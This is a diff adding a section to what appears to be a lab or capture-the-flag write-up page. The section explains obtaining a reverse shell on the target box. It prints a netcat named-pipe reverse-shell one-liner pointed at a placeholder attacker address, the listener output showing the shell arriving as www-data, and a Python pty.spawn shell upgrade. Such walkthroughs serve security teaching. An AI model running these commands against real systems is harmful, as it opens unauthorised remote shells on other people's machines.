@@ -85,6 +85,20 @@
 Listening on 0.0.0.0 444
 Connection received on 10.10.43.192 37146
                 </code></pre>
+                <p>Okay, so we can successfully execute a netcat command but we cannot use the "-e" option, which allows us to execute an external program after making the connection. Well, let's just do it manually instead, by creating a named pipe and redirecting stdin, stdout and stderr...</p>
+                <pre><code>mkfifo /tmp/f; nc attacking_ip_address 444 < /tmp/f | /bin/sh > /tmp/f 2>&1; rm /tmp/f</code></pre>
+                <p>We now have a reverse shell..</p>
+                <pre><code>case@local:~$ sudo nc -lvnp 444
+[sudo] password for case:
+Listening on 0.0.0.0 444
+Connection received on 10.10.43.192 37260
+whoami
+www-data
+                </code></pre>
+                <p>This is a bit clunky however, it doesn't give us a fully-fledged terminal environment.Let us see if we can spawn a pseudo-terminal using Python, to more accurately simulate a real terminal session; we know we are on a Linux box, Python3 is likely installed, let us give it a go...</p>
+                <pre><code>python3 -c 'import pty; pty.spawn("/bin/bash")'</code></pre>
+                <p>It worked a treat...</p>
+                <pre><code>www-data@ip-10-10-43-192:/var/www/html$</code></pre>
             </section>
             
             <section id="solution">
